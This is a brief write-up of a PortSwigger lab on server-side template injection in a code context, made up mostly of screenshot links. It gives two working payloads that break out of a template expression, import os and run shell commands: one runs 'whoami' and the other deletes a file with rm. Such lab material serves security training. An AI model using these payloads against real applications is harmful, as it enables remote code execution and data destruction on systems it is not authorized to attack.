# Basic server-side template injection (code context)
Lab URL :- 

`https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic-code-context`

![image](https://user-images.githubusercontent.com/60841283/153759383-08254f52-5d12-4299-bc49-0588d62f782b.png)

## Payload Test

![image](https://user-images.githubusercontent.com/60841283/153757582-7f560739-a5e2-4203-9bbc-52c7951ce0cb.png)

Viewing first name after commenting on a blog post.

![image](https://user-images.githubusercontent.com/60841283/153757617-2d9b282c-ee9c-4f41-be1e-8ee8d9addc69.png)

## Command exec
```html
}}{% import os %}{{os.system('whoami')}}
```
![image](https://user-images.githubusercontent.com/60841283/153757805-d6cb06b5-7697-4fb7-bfcc-c60d39a39c2c.png)

Comment and see the name and SSTI execution

![image](https://user-images.githubusercontent.com/60841283/153757894-7f870b84-d04e-47ba-b463-3bfc876bd4d1.png)

#### Deleting the file
```html
user.first_name}}{%25+import+os+%25}{{os.system('rm+/home/carlos/morale.txt')}}
```

![image](https://user-images.githubusercontent.com/60841283/153758029-ef40a697-ce4d-4a1b-b8cc-3f9002104a0a.png)

Comment and and SSTI executes.

![image](https://user-images.githubusercontent.com/60841283/153758034-070a00c6-e409-461b-89e6-6f82be8af4c4.png)
